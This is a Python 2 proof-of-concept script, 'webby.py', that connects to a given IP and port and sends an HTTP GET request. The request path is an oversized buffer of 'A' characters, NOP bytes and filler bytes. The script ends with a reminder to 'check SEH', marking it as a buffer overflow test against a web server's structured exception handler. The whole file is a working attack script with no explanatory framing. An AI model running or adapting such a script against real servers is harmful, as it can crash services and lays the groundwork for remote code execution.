#!/usr/bin/python

import socket
import sys
import os.path
import time

if len(sys.argv) < 2:
        print "Usage: webby.py <IP> <port>"
        sys.exit(0)

ips = sys.argv[1]
port = int(sys.argv[2])

string = "A"*790
string += "\x90"*4
string += "\x42"*105

method = "GET"
print "starting POC for:", ips
print ""

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
        connect=s.connect((ips, port))
except:
        print "no connection possible"
        sys.exit(1)

payload = method + ' http://'+ ips + '/' + string + ' HTTP/1.0\x0d\x0a\x0d\x0a'

print "\r\nsending payload"
print "\n\rusing methode %s with buffersize of: %s" % (method,str(len(string)))
print "..."

print payload
s.send(payload)
print "finished with method %s and payload %s" % (method,payload)
print "... check SEH"
